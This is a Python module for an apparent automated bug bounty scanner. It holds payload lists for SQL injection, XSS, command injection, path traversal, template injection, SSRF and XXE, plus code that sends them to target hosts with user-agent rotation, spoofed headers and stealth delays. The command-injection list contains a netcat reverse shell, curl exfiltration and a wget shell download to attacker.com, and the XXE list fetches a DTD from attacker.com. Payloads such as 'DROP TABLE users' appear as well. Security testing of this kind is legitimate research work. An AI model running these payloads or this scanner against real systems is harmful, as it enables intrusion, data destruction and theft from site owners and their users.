"""
Bug Bounty Hunter Professional Module
Advanced feature set for professional bug bounty hunting

This module provides specialized tools, settings, and methodologies
specifically designed for bug bounty hunters and security researchers.
"""

import asyncio
import random
from datetime import datetime
from typing import Dict, List, Any, Optional, Set
from enum import Enum
from dataclasses import dataclass, field
import aiohttp
import hashlib


class HuntingMode(str, Enum):
    """Bug bounty hunting modes."""
    STEALTH = "stealth"              # Low-profile, minimal requests
    AGGRESSIVE = "aggressive"        # Maximum coverage, fast scanning
    SURGICAL = "surgical"           # Targeted, specific vulnerability focus
    RECONNAISSANCE = "reconnaissance"  # Information gathering only
    EXPLOITATION = "exploitation"    # Proof-of-concept generation
    COMPLIANCE = "compliance"       # Standards-based testing (OWASP)


class VulnerabilityPriority(str, Enum):
    """Vulnerability priority for bug bounty focus."""
    CRITICAL = "critical"    # RCE, SQL Injection, Authentication Bypass
    HIGH = "high"           # XSS, CSRF, Directory Traversal
    MEDIUM = "medium"       # Information Disclosure, Weak Crypto
    LOW = "low"            # Rate Limiting, Minor Info Leaks
    INFO = "info"          # Reconnaissance findings


class PayloadCategory(str, Enum):
    """Payload categories for different attack vectors."""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    TEMPLATE_INJECTION = "template_injection"
    XXE = "xxe"
    SSRF = "ssrf"
    DESERIALIZATION = "deserialization"
    BUSINESS_LOGIC = "business_logic"
    AUTHENTICATION = "authentication"


@dataclass
class BugBountySettings:
    """Advanced settings for bug bounty hunting."""
    
    # Hunting Mode Configuration
    hunting_mode: HuntingMode = HuntingMode.STEALTH
    target_priority: VulnerabilityPriority = VulnerabilityPriority.CRITICAL
    
    # Request Settings
    concurrent_requests: int = 5        # Conservative for stealth
    request_delay_min: float = 0.5      # Minimum delay between requests
    request_delay_max: float = 2.0      # Maximum delay between requests
    timeout: int = 15                   # Request timeout
    retries: int = 2                    # Failed request retries
    
    # Evasion Settings
    user_agent_rotation: bool = True    # Rotate user agents
    proxy_rotation: bool = False        # Use proxy rotation
    header_randomization: bool = True   # Randomize headers
    encoding_evasion: bool = True       # Use encoding techniques
    
    # Scope Settings
    subdomain_enumeration: bool = True  # Find subdomains
    directory_bruteforce: bool = True   # Directory discovery
    parameter_discovery: bool = True    # Find hidden parameters
    endpoint_discovery: bool = True     # API endpoint discovery
    
    # Advanced Features
    ai_assisted_testing: bool = True    # AI-powered payload generation
    custom_wordlists: List[str] = field(default_factory=list)
    excluded_extensions: Set[str] = field(default_factory=lambda: {
        '.jpg', '.jpeg', '.png', '.gif', '.css', '.js', '.ico', '.svg'
    })
    
    # Report Settings
    generate_poc: bool = True           # Generate proof-of-concept
    include_screenshots: bool = True    # Capture evidence
    markdown_report: bool = True        # Generate markdown reports
    severity_scoring: bool = True       # CVSS scoring


@dataclass
class BugBountyTarget:
    """Target configuration for bug bounty hunting."""
    domain: str
    scope_urls: List[str] = field(default_factory=list)
    out_of_scope: List[str] = field(default_factory=list)
    program_name: str = ""
    bounty_range: str = ""
    program_url: str = ""
    special_instructions: str = ""
    allowed_methods: List[str] = field(default_factory=lambda: ["GET", "POST"])
    rate_limit: int = 100  # Requests per hour


@dataclass
class VulnerabilityFinding:
    """Vulnerability finding structure."""
    id: str
    title: str
    severity: VulnerabilityPriority
    category: PayloadCategory
    url: str
    method: str
    parameters: Dict[str, Any]
    payload: str
    response: str
    evidence: str
    proof_of_concept: str
    remediation: str
    cvss_score: float
    bounty_estimate: str
    timestamp: datetime
    confidence: float  # AI confidence score


class AdvancedPayloadGenerator:
    """Advanced payload generator for bug bounty hunting."""
    
    def __init__(self):
        self.payloads = self._load_payloads()
        self.custom_payloads = {}
        
    def _load_payloads(self) -> Dict[PayloadCategory, List[str]]:
        """Load comprehensive payload database."""
        return {
            PayloadCategory.SQL_INJECTION: [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR (SELECT SUBSTRING(@@version,1,1))='5'--",
                "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "' OR 1=1#",
                "' UNION SELECT 1,2,3,4,5--",
                "admin'--",
                "' OR 'x'='x",
                "') OR ('1'='1",
                "' OR 1=1 LIMIT 1--",
                "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            
            PayloadCategory.XSS: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src='javascript:alert(\"XSS\")'></iframe>",
                "<body onload=alert('XSS')>",
                "<script>alert(document.cookie)</script>",
                "'\"><script>alert('XSS')</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<img src=\"x\" onerror=\"alert('XSS')\">",
                "<svg/onload=alert('XSS')>",
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                "<img src=x onerror=confirm('XSS')>",
                "<script>prompt('XSS')</script>",
                "<marquee onstart=alert('XSS')>",
            ],
            
            PayloadCategory.COMMAND_INJECTION: [
                "; ls -la",
                "&& whoami",
                "| cat /etc/passwd",
                "; cat /etc/passwd",
                "`whoami`",
                "$(whoami)",
                "; ping -c 4 127.0.0.1",
                "&& curl http://attacker.com/$(whoami)",
                "; sleep 10",
                "| nc -e /bin/sh attacker.com 4444",
                "; wget http://attacker.com/shell.php",
                "&& id",
                "; uname -a",
                "| ps aux",
                "; netstat -an",
            ],
            
            PayloadCategory.PATH_TRAVERSAL: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "....\\\\....\\\\....\\\\etc\\\\passwd",
                "/var/www/../../../etc/passwd",
                "....//....//....//windows//system32//drivers//etc//hosts",
                "..//..//..//etc//passwd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",
                "....\\....\\....\\boot.ini",
                "../../../proc/self/environ",
                "....//....//....//proc//version",
                "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            ],
            
            PayloadCategory.TEMPLATE_INJECTION: [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%=7*7%>",
                "{{config.items()}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "${product.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(product.getClass().forName('java.lang.Runtime').getRuntime()).exec('whoami')}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "<%= 7 * 7 %>",
                "{{7*'7'}}",
                "${T(java.lang.System).getProperty('user.name')}",
                "{{''.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].exit()}}",
                "#set($ex=$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('whoami'))$ex.waitFor()#set($out=$e.getClass().forName('java.lang.System').getMethod('getProperty',[$e.getClass().forName('java.lang.String')]).invoke(null,['line.separator']))$e.getClass().forName('java.io.BufferedReader').getConstructor([$e.getClass().forName('java.io.Reader')]).newInstance([$e.getClass().forName('java.io.InputStreamReader').getConstructor([$e.getClass().forName('java.io.InputStream')]).newInstance([$ex.getInputStream()])]).readLine()",
                "{{lipsum.__globals__['os'].popen('id').read()}}",
                "<%- global.process.mainModule.require('child_process').execSync('whoami') %>",
            ],
            
            PayloadCategory.SSRF: [
                "http://localhost:80",
                "http://127.0.0.1:80",
                "http://0.0.0.0:80",
                "http://[::1]:80",
                "http://localhost:22",
                "http://127.0.0.1:3306",
                "file:///etc/passwd",
                "file:///windows/system32/drivers/etc/hosts",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "gopher://127.0.0.1:3306",
                "dict://127.0.0.1:11211",
                "ftp://127.0.0.1",
                "ldap://127.0.0.1",
                "sftp://127.0.0.1",
            ],
            
            PayloadCategory.XXE: [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hostname">]><data>&file;</data>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo></foo>',
                '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;]><test></test>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow">]><userInfo><firstName>John</firstName><lastName>&ent;</lastName></userInfo>',
                '<!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><data>&send;</data>',
            ]
        }
    
    def generate_contextual_payloads(self, category: PayloadCategory,
                                     context: Dict[str, Any]) -> List[str]:
        """Generate context-aware payloads."""
        base_payloads = self.payloads.get(category, [])
        contextual_payloads = []
        
        # Add context-specific modifications
        for payload in base_payloads:
            contextual_payloads.append(payload)
            
            # URL encoding variations
            if context.get('encoding') == 'url':
                import urllib.parse
                contextual_payloads.append(urllib.parse.quote(payload))
                contextual_payloads.append(urllib.parse.quote(payload, safe=''))
            
            # Double encoding
            if context.get('double_encoding'):
                import urllib.parse
                double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
                contextual_payloads.append(double_encoded)
            
            # Parameter pollution variations
            if context.get('parameter_name'):
                param_name = context['parameter_name']
                contextual_payloads.append(f"{param_name}={payload}")
                contextual_payloads.append(f"{param_name}[]={payload}")
        
        return contextual_payloads
    
    def generate_ai_payloads(self, target_info: Dict[str, Any]) -> List[str]:
        """Generate AI-assisted payloads based on target analysis."""
        ai_payloads = []
        
        # Technology-specific payloads
        if 'php' in target_info.get('technologies', []):
            ai_payloads.extend([
                "<?php phpinfo(); ?>",
                "<?php system('whoami'); ?>",
                "<?php echo file_get_contents('/etc/passwd'); ?>",
            ])
        
        if 'nodejs' in target_info.get('technologies', []):
            ai_payloads.extend([
                "require('child_process').exec('whoami')",
                "global.process.mainModule.require('child_process').execSync('id')",
            ])
        
        if 'python' in target_info.get('technologies', []):
            ai_payloads.extend([
                "__import__('os').system('whoami')",
                "exec('import os; os.system(\"id\")')",
            ])
        
        return ai_payloads


class BugBountyScanner:
    """Advanced bug bounty scanning engine."""
    
    def __init__(self, settings: BugBountySettings):
        self.settings = settings
        self.payload_generator = AdvancedPayloadGenerator()
        self.session = None
        self.findings: List[VulnerabilityFinding] = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.settings.timeout),
            connector=aiohttp.TCPConnector(limit=self.settings.concurrent_requests)
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    def _get_headers(self) -> Dict[str, str]:
        """Get randomized headers for evasion."""
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        
        if self.settings.user_agent_rotation:
            headers["User-Agent"] = random.choice(self.user_agents)
        
        if self.settings.header_randomization:
            # Add random headers for evasion
            extra_headers = {
                "X-Originating-IP": "127.0.0.1",
                "X-Forwarded-For": "127.0.0.1",
                "X-Remote-IP": "127.0.0.1",
                "X-Remote-Addr": "127.0.0.1",
            }
            headers.update(random.sample(list(extra_headers.items()), 
                          random.randint(0, len(extra_headers))))
        
        return headers
    
    async def _make_request(self, method: str, url: str, 
                           **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Make a request with evasion techniques."""
        # Ensure session is initialized
        if self.session is None:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=self.settings.timeout),
                connector=aiohttp.TCPConnector(
                    limit=self.settings.concurrent_requests
                )
            )
        
        headers = self._get_headers()
        headers.update(kwargs.get('headers', {}))
        
        # Random delay for stealth
        if self.settings.hunting_mode == HuntingMode.STEALTH:
            delay = random.uniform(self.settings.request_delay_min,
                                 self.settings.request_delay_max)
            await asyncio.sleep(delay)
        
        try:
            async with self.session.request(
                method, url, headers=headers, **kwargs
            ) as response:
                return response
        except Exception as e:
            print(f"Request failed: {e}")
            return None

    async def test_sql_injection(self, url: str, parameters: Dict[str, str]) -> List[VulnerabilityFinding]:
        """Advanced SQL injection testing."""
        findings = []
        
        sql_payloads = self.payload_generator.generate_contextual_payloads(
            PayloadCategory.SQL_INJECTION,
            {'encoding': 'url', 'double_encoding': True}
        )
        
        for param_name, param_value in parameters.items():
            for payload in sql_payloads[:10]:  # Limit for stealth
                test_params = parameters.copy()
                test_params[param_name] = payload
                
                response = await self._make_request(
                    'GET', url, params=test_params
                )
                
                if response and await self._detect_sql_injection(response, payload):
                    finding = VulnerabilityFinding(
                        id=f"sqli_{hashlib.md5(f'{url}{param_name}{payload}'.encode()).hexdigest()[:8]}",
                        title=f"SQL Injection in parameter '{param_name}'",
                        severity=VulnerabilityPriority.CRITICAL,
                        category=PayloadCategory.SQL_INJECTION,
                        url=url,
                        method='GET',
                        parameters={param_name: payload},
                        payload=payload,
                        response=await response.text(),
                        evidence=f"SQL error detected in response",
                        proof_of_concept=self._generate_sql_poc(url, param_name, payload),
                        remediation="Use parameterized queries and input validation",
                        cvss_score=9.0,
                        bounty_estimate="$500-$2000",
                        timestamp=datetime.now(),
                        confidence=0.85
                    )
                    findings.append(finding)
        
        return findings
    
    async def _detect_sql_injection(self, response: aiohttp.ClientResponse, 
                                  payload: str) -> bool:
        """Detect SQL injection vulnerabilities."""
        try:
            response_text = await response.text()
            
            # SQL error patterns
            sql_errors = [
                "mysql_fetch_array",
                "ORA-01756",
                "Microsoft OLE DB Provider for ODBC Drivers",
                "Microsoft JET Database Engine",
                "SQLServer JDBC Driver",
                "PostgreSQL query failed",
                "Warning: mysql_",
                "MySQLSyntaxErrorException",
                "valid MySQL result",
                "check the manual that corresponds to your MySQL",
                "Unknown column",
                "Syntax error",
                "sqlite3.OperationalError",
                "SQLSTATE",
                "com.mysql.jdbc.exceptions"
            ]
            
            response_lower = response_text.lower()
            for error_pattern in sql_errors:
                if error_pattern.lower() in response_lower:
                    return True
            
            # Time-based detection for blind SQL injection
            if "sleep" in payload.lower() or "waitfor" in payload.lower():
                # Implementation would measure response time
                pass
            
            return False
        except:
            return False
    
    async def test_xss(self, url: str, parameters: Dict[str, str]) -> List[VulnerabilityFinding]:
        """Advanced XSS testing with context awareness."""
        findings = []
        
        xss_payloads = self.payload_generator.generate_contextual_payloads(
            PayloadCategory.XSS,
            {'encoding': 'url'}
        )
        
        for param_name, param_value in parameters.items():
            for payload in xss_payloads[:8]:  # Limit for stealth
                test_params = parameters.copy()
                test_params[param_name] = payload
                
                response = await self._make_request(
                    'GET', url, params=test_params
                )
                
                if response and await self._detect_xss(response, payload):
                    finding = VulnerabilityFinding(
                        id=f"xss_{hashlib.md5(f'{url}{param_name}{payload}'.encode()).hexdigest()[:8]}",
                        title=f"Cross-Site Scripting (XSS) in parameter '{param_name}'",
                        severity=VulnerabilityPriority.HIGH,
                        category=PayloadCategory.XSS,
                        url=url,
                        method='GET',
                        parameters={param_name: payload},
                        payload=payload,
                        response=await response.text(),
                        evidence=f"XSS payload reflected in response",
                        proof_of_concept=self._generate_xss_poc(url, param_name, payload),
                        remediation="Implement proper input validation and output encoding",
                        cvss_score=6.1,
                        bounty_estimate="$100-$500",
                        timestamp=datetime.now(),
                        confidence=0.90
                    )
                    findings.append(finding)
        
        return findings
    
    async def _detect_xss(self, response: aiohttp.ClientResponse, 
                         payload: str) -> bool:
        """Detect XSS vulnerabilities."""
        try:
            response_text = await response.text()
            
            # Check if payload is reflected without proper encoding
            dangerous_reflections = [
                "<script>",
                "javascript:",
                "onerror=",
                "onload=",
                "alert(",
                "confirm(",
                "prompt("
            ]
            
            for dangerous in dangerous_reflections:
                if dangerous in payload.lower() and dangerous in response_text.lower():
                    return True
            
            return False
        except:
            return False
    
    def _generate_sql_poc(self, url: str, param: str, payload: str) -> str:
        """Generate SQL injection proof-of-concept."""
        return f"""
# SQL Injection Proof of Concept

**Vulnerable URL:** {url}
**Parameter:** {param}
**Payload:** {payload}

## Steps to Reproduce:
1. Navigate to: {url}
2. Inject payload in parameter '{param}': {payload}
3. Observe SQL error in response

## Impact:
- Database information disclosure
- Potential data extraction
- Possible authentication bypass

## Recommendation:
Use parameterized queries and proper input validation.
        """.strip()
    
    def _generate_xss_poc(self, url: str, param: str, payload: str) -> str:
        """Generate XSS proof-of-concept."""
        return f"""
# Cross-Site Scripting (XSS) Proof of Concept

**Vulnerable URL:** {url}
**Parameter:** {param}
**Payload:** {payload}

## Steps to Reproduce:
1. Navigate to: {url}
2. Inject payload in parameter '{param}': {payload}
3. Observe script execution in browser

## Impact:
- Session hijacking
- Credential theft
- Phishing attacks
- Admin account takeover

## Recommendation:
Implement proper output encoding and Content Security Policy (CSP).
        """.strip()
    
    async def comprehensive_scan(self, target: BugBountyTarget) -> List[VulnerabilityFinding]:
        """Perform comprehensive bug bounty scan."""
        all_findings = []
        
        print(f"🎯 Starting comprehensive scan for {target.domain}")
        print(f"🔍 Mode: {self.settings.hunting_mode}")
        print(f"🎯 Priority: {self.settings.target_priority}")
        
        # URL discovery
        urls = await self._discover_urls(target)
        print(f"📍 Discovered {len(urls)} URLs")
        
        # Parameter discovery
        for url in urls[:20]:  # Limit for demonstration
            parameters = await self._discover_parameters(url)
            
            if parameters:
                print(f"🔍 Testing {url} with {len(parameters)} parameters")
                
                # SQL Injection testing
                sql_findings = await self.test_sql_injection(url, parameters)
                all_findings.extend(sql_findings)
                
                # XSS testing
                xss_findings = await self.test_xss(url, parameters)
                all_findings.extend(xss_findings)
                
                # Rate limiting for stealth
                if self.settings.hunting_mode == HuntingMode.STEALTH:
                    await asyncio.sleep(1)
        
        return all_findings
    
    async def _discover_urls(self, target: BugBountyTarget) -> List[str]:
        """Discover URLs through various techniques."""
        urls = target.scope_urls.copy()
        
        if self.settings.subdomain_enumeration:
            # Subdomain enumeration (simplified)
            subdomains = await self._enumerate_subdomains(target.domain)
            urls.extend([f"https://{sub}" for sub in subdomains])
        
        if self.settings.directory_bruteforce:
            # Directory bruteforcing (simplified)
            directories = await self._bruteforce_directories(target.domain)
            urls.extend(directories)
        
        return list(set(urls))  # Remove duplicates
    
    async def _enumerate_subdomains(self, domain: str) -> List[str]:
        """Enumerate subdomains (simplified implementation)."""
        common_subdomains = [
            "www", "api", "admin", "test", "staging", "dev", "mail",
            "ftp", "blog", "shop", "portal", "app", "mobile"
        ]
        
        valid_subdomains = []
        for subdomain in common_subdomains:
            full_domain = f"{subdomain}.{domain}"
            try:
                response = await self._make_request('GET', f"https://{full_domain}")
                if response and response.status == 200:
                    valid_subdomains.append(full_domain)
            except:
                pass
        
        return valid_subdomains
    
    async def _bruteforce_directories(self, domain: str) -> List[str]:
        """Bruteforce directories (simplified implementation)."""
        common_directories = [
            "/admin", "/api", "/login", "/dashboard", "/panel",
            "/test", "/dev", "/staging", "/backup", "/config"
        ]
        
        valid_urls = []
        base_url = f"https://{domain}"
        
        for directory in common_directories:
            url = f"{base_url}{directory}"
            try:
                response = await self._make_request('GET', url)
                if response and response.status in [200, 403]:
                    valid_urls.append(url)
            except:
                pass
        
        return valid_urls
    
    async def _discover_parameters(self, url: str) -> Dict[str, str]:
        """Discover parameters through various techniques."""
        # Parse existing parameters from URL
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        existing_params = parse_qs(parsed.query)
        
        # Convert to simple dict
        parameters = {}
        for key, values in existing_params.items():
            parameters[key] = values[0] if values else ""
        
        # Add common parameter names for testing
        if not parameters and self.settings.parameter_discovery:
            common_params = [
                "id", "user", "page", "search", "q", "query",
                "name", "file", "path", "url", "redirect"
            ]
            for param in common_params[:3]:  # Limit for stealth
                parameters[param] = "test"
        
        return parameters


class BugBountyReporter:
    """Advanced reporting for bug bounty findings."""
    
    def __init__(self):
        self.template_dir = "templates"
    
    def generate_report(self, findings: List[VulnerabilityFinding], 
                       target: BugBountyTarget,
                       settings: BugBountySettings) -> str:
        """Generate comprehensive bug bounty report."""
        
        # Sort findings by severity
        severity_order = [
            VulnerabilityPriority.CRITICAL,
            VulnerabilityPriority.HIGH,
            VulnerabilityPriority.MEDIUM,
            VulnerabilityPriority.LOW,
            VulnerabilityPriority.INFO
        ]
        
        sorted_findings = sorted(
            findings, 
            key=lambda x: severity_order.index(x.severity)
        )
        
        report = f"""
# Bug Bounty Report: {target.program_name or target.domain}

**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
**Target:** {target.domain}  
**Program:** {target.program_name}  
**Scanning Mode:** {settings.hunting_mode}  
**Total Findings:** {len(findings)}

## Executive Summary

This report contains the results of a comprehensive security assessment performed on {target.domain}. The assessment identified **{len(findings)}** security vulnerabilities across various categories.

### Severity Breakdown
"""
        
        # Count by severity
        severity_counts = {}
        for finding in findings:
            severity_counts[finding.severity] = severity_counts.get(finding.severity, 0) + 1
        
        for severity in severity_order:
            count = severity_counts.get(severity, 0)
            if count > 0:
                emoji = {"critical": "🔴", "high": "🟡", "medium": "🟠", "low": "🔵", "info": "⚪"}
                report += f"- {emoji.get(severity.value, '⚪')} **{severity.value.upper()}**: {count}\n"
        
        report += "\n## Detailed Findings\n\n"
        
        # Detailed findings
        for i, finding in enumerate(sorted_findings, 1):
            severity_emoji = {
                "critical": "🔴", "high": "🟡", "medium": "🟠", 
                "low": "🔵", "info": "⚪"
            }
            
            report += f"""
### {i}. {severity_emoji.get(finding.severity.value, '⚪')} {finding.title}

**Severity:** {finding.severity.value.upper()}  
**CVSS Score:** {finding.cvss_score}  
**Category:** {finding.category.value.replace('_', ' ').title()}  
**Confidence:** {finding.confidence * 100:.1f}%  
**Estimated Bounty:** {finding.bounty_estimate}

**Vulnerable URL:** `{finding.url}`  
**Method:** {finding.method}  
**Parameters:** {', '.join(f'`{k}={v}`' for k, v in finding.parameters.items())}

**Payload:**
```
{finding.payload}
```

**Evidence:**
{finding.evidence}

**Impact:**
{self._get_impact_description(finding.category, finding.severity)}

**Proof of Concept:**
```
{finding.proof_of_concept}
```

**Remediation:**
{finding.remediation}

---
"""
        
        # Summary and recommendations
        report += f"""
## Summary and Recommendations

### Immediate Actions Required:
"""
        
        critical_high = [f for f in findings if f.severity in [VulnerabilityPriority.CRITICAL, VulnerabilityPriority.HIGH]]
        if critical_high:
            report += f"1. **Address {len(critical_high)} Critical/High severity vulnerabilities immediately**\n"
            for finding in critical_high[:3]:  # Top 3
                report += f"   - {finding.title}\n"
        
        report += """
### General Security Recommendations:
1. Implement a comprehensive input validation framework
2. Deploy Web Application Firewall (WAF) rules
3. Conduct regular security code reviews
4. Implement Content Security Policy (CSP)
5. Enable security headers across all applications
6. Establish a vulnerability disclosure program

### Testing Methodology:
This assessment used the following approach:
- **Reconnaissance:** Subdomain enumeration, directory discovery
- **Parameter Discovery:** Automated and manual parameter identification  
- **Vulnerability Testing:** Targeted payload injection and analysis
- **Verification:** Manual confirmation of automated findings

### Tools and Techniques:
- Custom bug bounty scanner with AI-assisted payload generation
- Context-aware testing methodologies
- Advanced evasion techniques for realistic testing

---

**Report Generated by:** Burp Suite Killer - Bug Bounty Professional  
**Contact:** security@researcher.com  
**Report ID:** {hashlib.md5(f"{target.domain}{datetime.now()}".encode()).hexdigest()[:12]}
"""
        
        return report
    
    def _get_impact_description(self, category: PayloadCategory, 
                               severity: VulnerabilityPriority) -> str:
        """Get impact description based on vulnerability type."""
        impacts = {
            PayloadCategory.SQL_INJECTION: "Complete database compromise, data extraction, authentication bypass",
            PayloadCategory.XSS: "Session hijacking, credential theft, admin account takeover",
            PayloadCategory.COMMAND_INJECTION: "Server compromise, data theft, lateral movement",
            PayloadCategory.PATH_TRAVERSAL: "Sensitive file disclosure, configuration exposure",
            PayloadCategory.TEMPLATE_INJECTION: "Remote code execution, server compromise",
            PayloadCategory.SSRF: "Internal network access, metadata service abuse",
            PayloadCategory.XXE: "File disclosure, denial of service, internal network access"
        }
        
        return impacts.get(category, "Security vulnerability that could lead to data compromise")


# Factory functions for easy usage
def create_stealth_hunter() -> BugBountyScanner:
    """Create a stealth-mode bug bounty hunter."""
    settings = BugBountySettings(
        hunting_mode=HuntingMode.STEALTH,
        concurrent_requests=3,
        request_delay_min=1.0,
        request_delay_max=3.0,
        user_agent_rotation=True,
        header_randomization=True
    )
    return BugBountyScanner(settings)


def create_aggressive_hunter() -> BugBountyScanner:
    """Create an aggressive-mode bug bounty hunter."""
    settings = BugBountySettings(
        hunting_mode=HuntingMode.AGGRESSIVE,
        concurrent_requests=20,
        request_delay_min=0.1,
        request_delay_max=0.5,
        subdomain_enumeration=True,
        directory_bruteforce=True,
        parameter_discovery=True
    )
    return BugBountyScanner(settings)


def create_surgical_hunter(target_category: PayloadCategory) -> BugBountyScanner:
    """Create a surgical-mode hunter targeting specific vulnerability types."""
    settings = BugBountySettings(
        hunting_mode=HuntingMode.SURGICAL,
        target_priority=VulnerabilityPriority.CRITICAL,
        concurrent_requests=5,
        ai_assisted_testing=True
    )
    return BugBountyScanner(settings)
